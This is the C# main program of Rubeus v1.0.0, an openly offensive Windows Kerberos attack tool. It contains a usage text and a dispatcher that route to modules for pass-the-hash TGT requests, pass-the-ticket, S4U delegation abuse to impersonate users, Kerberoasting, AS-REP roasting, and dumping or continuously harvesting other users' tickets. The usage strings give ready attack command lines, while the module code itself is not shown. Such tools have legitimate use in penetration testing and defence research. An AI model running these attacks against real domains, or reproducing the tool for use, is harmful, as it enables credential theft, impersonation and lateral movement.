using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Asn1;
using System.IO;
using System.Text.RegularExpressions;

namespace Rubeus
{
    class Program
    {
        public static void Logo()
        {
            System.Console.WriteLine("\r\n   ______        _                      ");
            System.Console.WriteLine("  (_____ \\      | |                     ");
            System.Console.WriteLine("   _____) )_   _| |__  _____ _   _  ___ ");
            System.Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
            System.Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
            System.Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
            System.Console.WriteLine("  v1.0.0\r\n");
        }

        public static void Usage()
        {
            Console.WriteLine("\r\n  Rubeus usage:");
            Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, optionally applying to the current logon session or a specific LUID:");
            Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]");
            Console.WriteLine("\r\n    Retrieve a TGT based on a user hash, start a /netonly process, and to apply the ticket to the new process/logon session:");
            Console.WriteLine("        Rubeus.exe asktgt /user:USER </rc4:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");
            Console.WriteLine("\r\n    Renew a TGT, optionally appling the ticket or auto-renewing the ticket up to its renew-till limit:");
            Console.WriteLine("        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]");
            Console.WriteLine("\r\n    Perform S4U constrained delegation abuse:");
            Console.WriteLine("        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
            Console.WriteLine("        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]");
            Console.WriteLine("\r\n    Submit a TGT, optionally targeting a specific LUID (if elevated):");
            Console.WriteLine("        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]");
            Console.WriteLine("\r\n    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):");
            Console.WriteLine("        Rubeus.exe purge [/luid:LOGINID]");
            Console.WriteLine("\r\n    Parse and describe a ticket (service ticket or TGT):");
            Console.WriteLine("        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>");
            Console.WriteLine("\r\n    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:");
            Console.WriteLine("        Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" [/show]");
            Console.WriteLine("\r\n    Perform Kerberoasting:");
            Console.WriteLine("        Rubeus.exe kerberoast [/spn:\"blah/blah\"] [/user:USER] [/ou:\"OU,...\"]");
            Console.WriteLine("\r\n    Perform Kerberoasting with alternate credentials:");
            Console.WriteLine("        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/ou:\"OU,...\"]");
            Console.WriteLine("\r\n    Perform AS-REP \"roasting\" for users without preauth:");
            Console.WriteLine("        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]");
            Console.WriteLine("\r\n    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:");
            Console.WriteLine("        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]");
            Console.WriteLine("\r\n    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:");
            Console.WriteLine("        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]");
            Console.WriteLine("\r\n    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:");
            Console.WriteLine("        Rubeus.exe harvest [/interval:MINUTES]");

            Console.WriteLine("\r\n\r\n  NOTE: Base64 ticket blobs can be decoded with :");
            Console.WriteLine("\r\n      [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"aa...\"))\r\n");
        }

        static void Main(string[] args)
        {
            Logo();

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf(':');
                if (idx > 0)
                {
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
                else
                {
                    arguments[argument] = "";
                }
            }

            if (arguments.ContainsKey("asktgt"))
            {
                string user = "";
                string domain = "";
                string hash = "";
                string dc = "";
                bool ptt = false;
                uint luid = 0;
                Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/domain"))
                {
                    domain = arguments["/domain"];
                }
                if (arguments.ContainsKey("/dc"))
                {
                    dc = arguments["/dc"];
                }
                if (arguments.ContainsKey("/rc4"))
                {
                    hash = arguments["/rc4"];
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                if (arguments.ContainsKey("/aes256"))
                {
                    hash = arguments["/aes256"];
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                if (arguments.ContainsKey("/ptt"))
                {
                    ptt = true;
                }

                if (arguments.ContainsKey("/luid"))
                {
                    try
                    {
                        luid = UInt32.Parse(arguments["/luid"]);
                    }
                    catch
                    {
                        try
                        {
                            luid = Convert.ToUInt32(arguments["/luid"], 16);
                        }
                        catch
                        {
                            Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/LUID"]);
                            return;
                        }
                    }
                }


                if (arguments.ContainsKey("/createnetonly"))
                {
                    // if we're starting a hidden process to apply the ticket to
                    if (!Helpers.IsHighIntegrity())
                    {
                        Console.WriteLine("[X] You need to be in high integrity to apply a ticket to created logon session");
                        return;
                    }
                    if (arguments.ContainsKey("/show"))
                    {
                        luid = LSA.CreateProcessNetOnly(arguments["/createnetonly"], true);
                    }
                    else
                    {
                        luid = LSA.CreateProcessNetOnly(arguments["/createnetonly"], false);
                    }
                    Console.WriteLine();
                }

                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                }
                if (String.IsNullOrEmpty(hash))
                {
                    Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                    return;
                }

                if ( !((encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)) )
                {
                    Console.WriteLine("\r\n[X] Only /rc4 and /aes256 are supported at this time.\r\n");
                    return;
                }
                else
                {
                    Ask.TGT(user, domain, hash, encType, ptt, dc, luid);
                    return;
                }
            }

            if (arguments.ContainsKey("renew"))
            {
                bool ptt = false;
                string dc = "";

                if (arguments.ContainsKey("/ptt"))
                {
                    ptt = true;
                }

                if (arguments.ContainsKey("/dc"))
                {
                    dc = arguments["/dc"];
                }

                if (arguments.ContainsKey("/ticket"))
                {
                    string kirbi64 = arguments["/ticket"];

                    if (Helpers.IsBase64String(kirbi64))
                    {
                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        if (arguments.ContainsKey("/autorenew"))
                        {
                            // if we want to auto-renew the TGT up until the renewal limit
                            Renew.TGTAutoRenew(kirbi, dc);
                        }
                        else
                        {
                            // otherwise a single renew operation
                            byte[] blah = Renew.TGT(kirbi, ptt, dc);
                        }
                    }
                    else if (File.Exists(kirbi64))
                    {
                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        if (arguments.ContainsKey("/autorenew"))
                        {
                            // if we want to auto-renew the TGT up until the renewal limit
                            Renew.TGTAutoRenew(kirbi, dc);
                        }
                        else
                        {
                            // otherwise a single renew operation
                            byte[] blah = Renew.TGT(kirbi, ptt, dc);
                        }
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    }
                    return;
                }
                else
                {
                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for renewal!\r\n");
                    return;
                }
            }

            if (arguments.ContainsKey("s4u"))
            {
                string targetUser = "";
                string targetSPN = "";
                string altSname = "";
                string user = "";
                string domain = "";
                string hash = "";
                bool ptt = false;
                string dc = "";
                Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/domain"))
                {
                    domain = arguments["/domain"];
                }
                if (arguments.ContainsKey("/ptt"))
                {
                    ptt = true;
                }
                if (arguments.ContainsKey("/dc"))
                {
                    dc = arguments["/dc"];
                }
                if (arguments.ContainsKey("/rc4"))
                {
                    hash = arguments["/rc4"];
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                if (arguments.ContainsKey("/aes256"))
                {
                    hash = arguments["/aes256"];
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                if (arguments.ContainsKey("/impersonateuser"))
                {
                    targetUser = arguments["/impersonateuser"];
                }

                if (arguments.ContainsKey("/msdsspn"))
                {
                    targetSPN = arguments["/msdsspn"];
                }

                if (arguments.ContainsKey("/altservice"))
                {
                    altSname = arguments["/altservice"];
                }

                if (String.IsNullOrEmpty(targetUser))
                {
                    Console.WriteLine("\r\n[X] You must supply a /impersonateuser to impersonate!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(targetSPN))
                {
                    Console.WriteLine("\r\n[X] You must supply a /msdsspn !\r\n");
                    return;
                }

                if (arguments.ContainsKey("/ticket"))
                {
                    string kirbi64 = arguments["/ticket"];

                    if (Helpers.IsBase64String(kirbi64))
                    {
                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        S4U.Execute(kirbi, targetUser, targetSPN, ptt, dc, altSname);
                    }
                    else if (File.Exists(kirbi64))
                    {
                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        S4U.Execute(kirbi, targetUser, targetSPN, ptt, dc, altSname);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    }
                    return;
                }
                else if (arguments.ContainsKey("/user"))
                {
                    // if the user is supplying a user and rc4/aes256 hash to first execute a TGT request

                    user = arguments["/user"];

                    if (String.IsNullOrEmpty(hash))
                    {
                        Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                        return;
                    }

                    S4U.Execute(user, domain, hash, encType, targetUser, targetSPN, ptt, dc, altSname);
                    return;
                }
                else
                {
                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied for S4U!");
                    Console.WriteLine("[X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n");
                    return;
                }
            }

            if (arguments.ContainsKey("ptt"))
            {
                uint luid = 0;
                if (arguments.ContainsKey("/luid"))
                {
                    try
                    {
                        luid = UInt32.Parse(arguments["/luid"]);
                    }
                    catch
                    {
                        try
                        {
                            luid = Convert.ToUInt32(arguments["/luid"], 16);
                        }
                        catch
                        {
                            Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/LUID"]);
                            return;
                        }
                    }
                }

                if (arguments.ContainsKey("/ticket"))
                {
                    string kirbi64 = arguments["/ticket"];

                    if (Helpers.IsBase64String(kirbi64))
                    {
                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                        LSA.ImportTicket(kirbiBytes, luid);
                    }
                    else if (File.Exists(kirbi64))
                    {
                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                        LSA.ImportTicket(kirbiBytes, luid);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X]/ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    }
                    return;
                }
                else
                {
                    Console.WriteLine("\r\n[X] A base64 .kirbi file needs to be supplied!\r\n");
                    return;
                }
            }

            if (arguments.ContainsKey("purge"))
            {
                uint luid = 0;
                if (arguments.ContainsKey("/luid"))
                {
                    try
                    {
                        luid = UInt32.Parse(arguments["/luid"]);
                    }
                    catch
                    {
                        try
                        {
                            luid = Convert.ToUInt32(arguments["/luid"], 16);
                        }
                        catch
                        {
                            Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/LUID"]);
                            return;
                        }
                    }
                }

                LSA.Purge(luid);
            }

            else if (arguments.ContainsKey("kerberoast"))
            {
                string spn = "";
                string user = "";
                string OU = "";

                if (arguments.ContainsKey("/spn"))
                {
                    spn = arguments["/spn"];
                }
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/ou"))
                {
                    OU = arguments["/ou"];
                }

                if (arguments.ContainsKey("/creduser"))
                {
                    if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                    {
                        Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                        return;
                    }

                    string[] parts = arguments["/creduser"].Split('\\');
                    string domainName = parts[0];
                    string userName = parts[1];

                    if (!arguments.ContainsKey("/credpassword"))
                    {
                        Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                        return;
                    }

                    string password = arguments["/credpassword"];

                    System.Net.NetworkCredential cred = new System.Net.NetworkCredential(userName, password, domainName);

                    Roast.Kerberoast(spn, user, OU, cred);
                }
                else
                {
                    Roast.Kerberoast(spn, user, OU);
                }
            }

            else if (arguments.ContainsKey("asreproast"))
            {
                string user = "";
                string domain = "";
                string dc = "";

                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/domain"))
                {
                    domain = arguments["/domain"];
                }
                if (arguments.ContainsKey("/dc"))
                {
                    dc = arguments["/dc"];
                }

                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                }

                if (String.IsNullOrEmpty(dc))
                {
                    Roast.ASRepRoast(user, domain);
                }
                else
                {
                    Roast.ASRepRoast(user, domain, dc);
                }
            }

            else if (arguments.ContainsKey("dump"))
            {
                if (arguments.ContainsKey("/luid"))
                {
                    string service = "";
                    if (arguments.ContainsKey("/service"))
                    {
                        service = arguments["/service"];
                    }
                    UInt32 luid = 0;
                    try
                    {
                        luid = UInt32.Parse(arguments["/luid"]);
                    }
                    catch
                    {
                        try
                        {
                            luid = Convert.ToUInt32(arguments["/luid"], 16);
                        }
                        catch
                        {
                            Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/LUID"]);
                            return;
                        }
                    }
                    LSA.ListKerberosTicketData(luid, service);
                }
                else if (arguments.ContainsKey("/service"))
                {
                    LSA.ListKerberosTicketData(0, arguments["/service"]);
                }
                else
                {
                    LSA.ListKerberosTicketData();
                }
            }

            else if (arguments.ContainsKey("monitor"))
            {
                string targetUser = "";
                int interval = 60;
                if (arguments.ContainsKey("/filteruser"))
                {
                    targetUser = arguments["/filteruser"];
                }
                if (arguments.ContainsKey("/interval"))
                {
                    interval = Int32.Parse(arguments["/interval"]);
                }
                Harvest.Monitor4624(interval, targetUser);
            }

            else if (arguments.ContainsKey("harvest"))
            {
                int intervalMinutes = 60;
                if (arguments.ContainsKey("/interval"))
                {
                    intervalMinutes = Int32.Parse(arguments["/interval"]);
                }
                Harvest.HarvestTGTs(intervalMinutes);
            }

            else if (arguments.ContainsKey("describe"))
            {
                if (arguments.ContainsKey("/ticket"))
                {
                    string kirbi64 = arguments["/ticket"];

                    if (Helpers.IsBase64String(kirbi64))
                    {
                        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        LSA.DisplayTicket(kirbi);
                    }
                    else if (File.Exists(kirbi64))
                    {
                        byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                        KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                        LSA.DisplayTicket(kirbi);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    }
                    return;
                }
                else
                {
                    Console.WriteLine("\r\n[X] A base64 .kirbi /ticket file needs to be supplied!\r\n");
                    return;
                }
            }

            else if (arguments.ContainsKey("createnetonly"))
            {

                if (arguments.ContainsKey("/program"))
                {
                    if (arguments.ContainsKey("/show"))
                    {
                        LSA.CreateProcessNetOnly(arguments["/program"], true);
                    }
                    else
                    {
                        LSA.CreateProcessNetOnly(arguments["/program"]);
                    }
                }

                else
                {
                    Console.WriteLine("\r\n[X] A /program needs to be supplied!\r\n");
                }
            }

            else {
                Usage();
            }
        }
    }
}
